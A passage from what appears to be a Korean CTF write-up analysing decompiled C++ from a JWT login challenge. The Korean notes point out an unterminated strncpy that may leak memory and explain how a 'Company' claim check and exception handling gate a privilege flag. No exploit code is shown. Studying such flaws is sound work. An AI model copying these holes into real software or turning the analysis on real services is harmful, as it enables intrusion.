</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">initialize</span>(                                   <span style="color:#75715e">// memleak. 0x10 sz username.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    (<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#a6e22e">object</span>.<span style="color:#a6e22e">username</span>,
</span></span><span style="display:flex;"><span>    (<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#a6e22e">object</span>.<span style="color:#a6e22e">email</span>,
</span></span><span style="display:flex;"><span>    (<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#a6e22e">object</span>.<span style="color:#a6e22e">Car</span>,
</span></span><span style="display:flex;"><span>    (<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#a6e22e">object</span>.<span style="color:#a6e22e">Vin</span>,
</span></span><span style="display:flex;"><span>    (<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#a6e22e">object</span>.<span style="color:#a6e22e">Company</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">initialize_object</span>(<span style="color:#a6e22e">vin</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">allocator</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span><span style="color:#f92672">&gt;::</span><span style="color:#a6e22e">allocator</span>(<span style="color:#a6e22e">v15</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">new_string</span>(<span style="color:#a6e22e">dreamhack_string</span>, <span style="color:#e6db74">&#34;Dreamhack&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">v3</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">setting_iss</span>((<span style="color:#a6e22e">__int64</span>)<span style="color:#a6e22e">vin</span>, (<span style="color:#a6e22e">__int64</span>)<span style="color:#a6e22e">dreamhack_string</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">allocator</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span><span style="color:#f92672">&gt;::</span><span style="color:#a6e22e">allocator</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">v15</span>[<span style="color:#ae81ff">1</span>]);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">new_string</span>(<span style="color:#a6e22e">v33</span>, <span style="color:#e6db74">&#34;JWT&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">v4</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">setting_typ</span>(<span style="color:#a6e22e">v3</span>, (<span style="color:#a6e22e">__int64</span>)<span style="color:#a6e22e">v33</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>(<span style="color:#a6e22e">_DWORD</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">v16</span>[<span style="color:#ae81ff">8</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">30</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">sub_115E4</span>(<span style="color:#a6e22e">v19</span>, (<span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">v16</span>[<span style="color:#ae81ff">8</span>]);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">v20</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">sub_11607</span>((<span style="color:#a6e22e">__int64</span>)<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">v18</span>, (<span style="color:#a6e22e">__int64</span>)<span style="color:#a6e22e">v19</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">v5</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">setting_exp</span>(<span style="color:#a6e22e">v4</span>, (<span style="color:#a6e22e">__int64</span>)<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">v20</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">allocator</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span><span style="color:#f92672">&gt;::</span><span style="color:#a6e22e">allocator</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">v15</span>[<span style="color:#ae81ff">2</span>]);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">new_string</span>(<span style="color:#a6e22e">usrname</span>, (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#a6e22e">object</span>.<span style="color:#a6e22e">username</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">set_data</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">data</span>, (<span style="color:#a6e22e">__int64</span>)<span style="color:#a6e22e">usrname</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">allocator</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span><span style="color:#f92672">&gt;::</span><span style="color:#a6e22e">allocator</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">v15</span>[<span style="color:#ae81ff">3</span>]);     <span style="color:#75715e">// allocator doesnt do anything. just a dummy function
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">new_string</span>(<span style="color:#a6e22e">username_string</span>, <span style="color:#e6db74">&#34;username&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">v6</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">sub_117B0</span>(<span style="color:#a6e22e">v5</span>, (<span style="color:#a6e22e">__int64</span>)<span style="color:#a6e22e">username_string</span>, <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">data</span>);<span style="color:#75715e">// v31+8 -&gt; string_ptr
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">allocator</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span><span style="color:#f92672">&gt;::</span><span style="color:#a6e22e">allocator</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">v15</span>[<span style="color:#ae81ff">4</span>]);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">new_string</span>(<span style="color:#a6e22e">a1</span>, (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#a6e22e">object</span>.<span style="color:#a6e22e">email</span>);
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JavaScript" data-lang="JavaScript"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">username</span> )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">v5</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">strlen</span>(<span style="color:#a6e22e">username</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">strncpy</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#a6e22e">ptr</span>, <span style="color:#a6e22e">username</span>, <span style="color:#a6e22e">v5</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">email</span> )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">l</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">strlen</span>(<span style="color:#a6e22e">email</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">v7</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">ptr</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">v7</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">email</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">__int64</span>)<span style="color:#a6e22e">malloc</span>(<span style="color:#a6e22e">l</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">strcpy</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#a6e22e">ptr</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">email</span>, <span style="color:#a6e22e">email</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">car</span> )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">l_1</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">strlen</span>(<span style="color:#a6e22e">car</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">v9</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">ptr</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">v9</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">car</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">__int64</span>)<span style="color:#a6e22e">malloc</span>(<span style="color:#a6e22e">l_1</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">strcpy</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#a6e22e">ptr</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">car</span>, <span style="color:#a6e22e">car</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">vin</span> )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">v10</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">strlen</span>(<span style="color:#a6e22e">vin</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">v11</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">ptr</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">v11</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">vin</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">__int64</span>)<span style="color:#a6e22e">malloc</span>(<span style="color:#a6e22e">v10</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">strcpy</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#a6e22e">ptr</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">vin</span>, <span style="color:#a6e22e">vin</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">company</span> )
</span></span></code></pre></div><p>다음과 같이 여러 필드를 받으며, 이에 따라 JWT 토큰을 발급한다.
initialize 함수에서 0x10 size로 검증한다.
null terminated가 제대로 이루어지지 않을 수 있다.
ptr에 저장된 객체가 참조되며 프린트된다면, memory leak이 발생할 수 있다.
<img loading="lazy" src="/blog/Dreamhack_KAIST_POSTECH_CTF_2023/graph.png" alt=""  />

Hex-rays 상에선 보이지 않지만, graph view에선 실제로는 c++의 code level exception의 핸들러들도 구현이 되어있다.
만약 exception이 raise되면, exception에 따라 stack unwinding 등의 작업을 수행한다.
<img loading="lazy" src="/blog/Dreamhack_KAIST_POSTECH_CTF_2023/graph1.png" alt=""  />
</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JavaScript" data-lang="JavaScript"><span style="display:flex;"><span> 	<span style="color:#a6e22e">v3</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">json_object_object_get</span>(<span style="color:#a6e22e">obj</span>, <span style="color:#e6db74">&#34;args&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">v4</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">json_object_object_get</span>(<span style="color:#a6e22e">v3</span>, <span style="color:#e6db74">&#34;token&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">chk_string</span>(<span style="color:#a6e22e">v4</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span><span style="color:#a6e22e">v4</span> )
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">token</span> <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#a6e22e">json_object_get_string</span>(<span style="color:#a6e22e">v4</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span><span style="color:#a6e22e">token</span> )
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">allocator</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span><span style="color:#f92672">&gt;::</span><span style="color:#a6e22e">allocator</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">v2</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">3</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">new_string</span>(<span style="color:#a6e22e">tok</span>, <span style="color:#a6e22e">token</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">allocator</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span><span style="color:#f92672">&gt;::~</span><span style="color:#a6e22e">allocator</span>();
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">string</span><span style="color:#f92672">::</span><span style="color:#a6e22e">operator</span><span style="color:#f92672">=</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">current_token</span>, <span style="color:#a6e22e">tok</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">sub_F323</span>((<span style="color:#a6e22e">__int64</span>)<span style="color:#a6e22e">v7</span>, (<span style="color:#a6e22e">__int64</span>)<span style="color:#a6e22e">tok</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">sub_F40E</span>((<span style="color:#a6e22e">__int64</span>)<span style="color:#a6e22e">v8</span>, (<span style="color:#a6e22e">__int64</span>)<span style="color:#a6e22e">v7</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">verify</span>((<span style="color:#a6e22e">__int64</span>)<span style="color:#a6e22e">v8</span>);                          <span style="color:#75715e">// exception can be thrown here
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">sub_F27A</span>((<span style="color:#a6e22e">__int64</span>)<span style="color:#a6e22e">v8</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">operator</span><span style="color:#f92672">&lt;&lt;&lt;</span><span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">char_traits</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span><span style="color:#f92672">&gt;&gt;</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">cout</span>, <span style="color:#e6db74">&#34;Login success\n&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">sub_F27A</span>((<span style="color:#a6e22e">__int64</span>)<span style="color:#a6e22e">v7</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">string</span><span style="color:#f92672">::~</span><span style="color:#a6e22e">string</span>(<span style="color:#a6e22e">tok</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span><span style="color:#a6e22e">LL</span>;
</span></span></code></pre></div><p>jwt token을 입력으로 받아서 로그인을 수행한다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JavaScript" data-lang="JavaScript"><span style="display:flex;"><span>  <span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">allocator</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span><span style="color:#f92672">&gt;::</span><span style="color:#a6e22e">allocator</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">v6</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">new_string</span>(<span style="color:#a6e22e">v12</span>, <span style="color:#e6db74">&#34;Dreamhack&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">v2</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">sub_11DCE</span>(<span style="color:#a6e22e">v1</span>, (<span style="color:#a6e22e">__int64</span>)<span style="color:#a6e22e">v12</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">allocator</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span><span style="color:#f92672">&gt;::</span><span style="color:#a6e22e">allocator</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">v7</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">new_string</span>(<span style="color:#a6e22e">v13</span>, <span style="color:#e6db74">&#34;Dreamhack&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">set_data</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">v9</span>, (<span style="color:#a6e22e">__int64</span>)<span style="color:#a6e22e">v13</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">allocator</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span><span style="color:#f92672">&gt;::</span><span style="color:#a6e22e">allocator</span>(<span style="color:#a6e22e">v8</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">new_string</span>(<span style="color:#a6e22e">v14</span>, <span style="color:#e6db74">&#34;Company&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">v3</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">sub_11F76</span>(<span style="color:#a6e22e">v2</span>, (<span style="color:#a6e22e">__int64</span>)<span style="color:#a6e22e">v14</span>, (<span style="color:#a6e22e">__int64</span>)<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">v9</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">verify_0</span>(<span style="color:#a6e22e">v3</span>, <span style="color:#a6e22e">rdi0</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">string</span><span style="color:#f92672">::~</span><span style="color:#a6e22e">string</span>(<span style="color:#a6e22e">v14</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">allocator</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span><span style="color:#f92672">&gt;::~</span><span style="color:#a6e22e">allocator</span>(<span style="color:#a6e22e">v8</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">sub_F350</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">v9</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">string</span><span style="color:#f92672">::~</span><span style="color:#a6e22e">string</span>(<span style="color:#a6e22e">v13</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">allocator</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span><span style="color:#f92672">&gt;::~</span><span style="color:#a6e22e">allocator</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">v7</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">string</span><span style="color:#f92672">::~</span><span style="color:#a6e22e">string</span>(<span style="color:#a6e22e">v12</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">allocator</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span><span style="color:#f92672">&gt;::~</span><span style="color:#a6e22e">allocator</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">v6</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">sub_F370</span>((<span style="color:#a6e22e">__int64</span>)<span style="color:#a6e22e">v15</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">string</span><span style="color:#f92672">::~</span><span style="color:#a6e22e">string</span>(<span style="color:#a6e22e">a1</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">allocator</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span><span style="color:#f92672">&gt;::~</span><span style="color:#a6e22e">allocator</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">v5</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">sub_F10A</span>((<span style="color:#a6e22e">__int64</span>)<span style="color:#a6e22e">v10</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">priv_flag</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;                                <span style="color:#75715e">// if Exception Thrown, priv_flag = 0
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">v16</span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">__readfsqword</span>(<span style="color:#ae81ff">0x28</span><span style="color:#a6e22e">u</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>verify 함수에서 priv_flag가 1이 되면 로그인에 성공하게 된다.
이때 JWT 토큰의 Company가 Dreamhack인지를 검증하게 되며, 아니라면 exception이 raise된다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JavaScript" data-lang="JavaScript"><span style="display:flex;"><span><span style="color:#a6e22e">v5</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">__readfsqword</span>(<span style="color:#ae81ff">0x28</span><span style="color:#a6e22e">u</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">sub_9E62</span>((<span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">_V2</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">v3</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">sub_15EDC</span>(<span style="color:#a6e22e">a1</span>, <span style="color:#a6e22e">a2</span>, (<span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">_V2</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">v3</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">sub_E470</span>(<span style="color:#a6e22e">v3</span>, <span style="color:#a6e22e">v4</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">v5</span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">__readfsqword</span>(<span style="color:#ae81ff">0x28</span><span style="color:#a6e22e">u</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JavaScript" data-lang="JavaScript"><span style="display:flex;"><span>  <span style="color:#a6e22e">result</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">sub_9FB6</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">v18</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( (<span style="color:#a6e22e">_BYTE</span>)<span style="color:#a6e22e">result</span> )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">v3</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">sub_CF54</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">v4</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">sub_9F24</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">v18</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( (<span style="color:#a6e22e">unsigned</span> <span style="color:#a6e22e">__int8</span>)<span style="color:#a6e22e">sub_9E44</span>(<span style="color:#a6e22e">v4</span>, <span style="color:#a6e22e">v3</span>) )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">exception</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">__cxa_allocate_exception</span>(<span style="color:#ae81ff">0x20</span><span style="color:#a6e22e">uLL</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">sub_E2FE</span>(<span style="color:#a6e22e">exception</span>, (<span style="color:#a6e22e">unsigned</span> <span style="color:#66d9ef">int</span>)<span style="color:#a6e22e">v18</span>, <span style="color:#a6e22e">v19</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">__cxa_throw</span>(<span style="color:#a6e22e">exception</span>, (<span style="color:#a6e22e">struct</span> <span style="color:#a6e22e">type_info</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">typeinfo</span> <span style="color:#66d9ef">for</span><span style="color:#e6db74">&#39;jwt::error::rsa_exception, sub_26EFC);
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    }
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    v6 = sub_D346();
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    v7 = sub_9F24(&amp;v18);
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    if ( (unsigned __int8)sub_9E44(v7, v6) )
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    {
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      v8 = __cxa_allocate_exception(0x20uLL);
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      sub_E348(v8, (unsigned int)v18, v19);
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      __cxa_throw(v8, (struct type_info *)&amp;`typeinfo for&#39;</span><span style="color:#a6e22e">jwt</span><span style="color:#f92672">::</span><span style="color:#a6e22e">error</span><span style="color:#f92672">::</span><span style="color:#a6e22e">ecdsa_exception</span>, <span style="color:#a6e22e">sub_26E9E</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">v9</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">sub_D78D</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">v10</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">sub_9F24</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">v18</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( (<span style="color:#a6e22e">unsigned</span> <span style="color:#a6e22e">__int8</span>)<span style="color:#a6e22e">sub_9E44</span>(<span style="color:#a6e22e">v10</span>, <span style="color:#a6e22e">v9</span>) )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">v11</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">__cxa_allocate_exception</span>(<span style="color:#ae81ff">0x20</span><span style="color:#a6e22e">uLL</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">sub_E392</span>(<span style="color:#a6e22e">v11</span>, (<span style="color:#a6e22e">unsigned</span> <span style="color:#66d9ef">int</span>)<span style="color:#a6e22e">v18</span>, <span style="color:#a6e22e">v19</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">__cxa_throw</span>(<span style="color:#a6e22e">v11</span>, (<span style="color:#a6e22e">struct</span> <span style="color:#a6e22e">type_info</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">typeinfo</span> <span style="color:#66d9ef">for</span><span style="color:#e6db74">&#39;jwt::error::signature_verification_exception, sub_26FB8);
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    }
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    v12 = sub_DE33();
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    v13 = sub_9F24(&amp;v18);
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    if ( (unsigned __int8)sub_9E44(v13, v12) )
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    {
